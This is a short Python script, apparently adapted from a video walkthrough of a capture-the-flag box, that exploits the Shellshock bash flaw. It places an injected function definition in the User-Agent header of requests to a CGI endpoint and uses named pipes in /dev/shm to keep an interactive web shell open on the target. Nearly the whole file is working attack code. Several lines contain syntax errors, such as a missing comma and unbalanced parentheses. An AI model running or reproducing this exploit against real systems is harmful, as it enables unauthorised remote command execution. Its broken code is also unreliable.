#!/usr/bin/python3
from IPython.core.debugger import Tracer; breakpoint = Tracer()
import requests
import time
from base64 import b64encode
from random import randrange
import threading
#taken from sokar video ~13 min #not tested webshell.py
#make a web shell that will retain previous commands (like the directory), can even get a tty shell with import pty
#used for shellshock shell shock


class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run args=())
		thread.daemon = True
		thread.start()
		
	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)
		
def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	headers = {
		'User-Agent' : '() { :; }; echo "Content-Type: text/html"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo "%s" | base64 -d | sh' % (cmd)
		}
	result = requests.get('http://1.1.1.1:8000/cgi-bin/cat', headers=headers, timeout=5).text).strip())
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	headers = {
		'User-Agent' : '() { :; }; echo "Content-Type: text/html"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo "%s" | base64 -d > %s' % (cmd, stdin)
		}
	result = requests.get('http://1.1.1.1:8000/cgi-bin/cat', headers=headers, timeout=5).text).strip())
	return result	

def ReadCmd():
	GetOutput = """/bin/cat %s""" % (stdout)
	output = RunCmd(GetOutput)
	return output

def SetupShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None
	
global stdin, stdout
session = randrange(1000,9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)


SetupShell()
#infinite loop to read stdout file
ReadingTheThings = AllTheReads()
while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)
	
